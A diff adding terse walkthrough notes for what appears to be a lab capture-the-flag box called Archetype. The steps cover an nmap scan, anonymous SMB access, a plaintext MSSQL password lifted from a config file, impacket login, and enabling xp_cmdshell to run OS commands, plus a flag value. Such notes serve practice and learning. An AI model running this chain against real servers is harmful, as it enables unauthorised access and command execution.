@@ -119,3 +119,29 @@
 - python3 -m http.server 8000
 - cat /var/www/flag.txt
 - flag: `a980d99281a28d638ac68b9bf9453c2b`
+
+
+
+## Archetype Challenge:
+- sudo nmap -sC -sV 10.129.95.187
+- sudo apt install smbclient
+- smbclient -N -L \\\\10.129.95.187\\
+- smbclient -N \\\\10.129.95.187\\backups
+- smb> ls
+- smb> get prod.dtsConfig
+- cat
+- Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc
+- git clone https://github.com/SecureAuthCorp/impacket.git
+- cd impacket
+- pip3 install .
+- cd impacket/examples/
+- python3 mssqlclient.py -h
+- SQL> help
+- SQL> SELECT is_srvrolemember('sysadmin');
+- SQL> EXEC xp_cmdshell 'net user';
+- sql> EXEC sp_configure 'show advanced options', 1;
+- sql> RECONFIGURE;
+- sql> sp_configure;
+- sql> EXEC sp_configure 'xpcmdshell', 1;
+- sql> RECONFIGURE;
+- SQL>  xp_cmdshell "whoami"
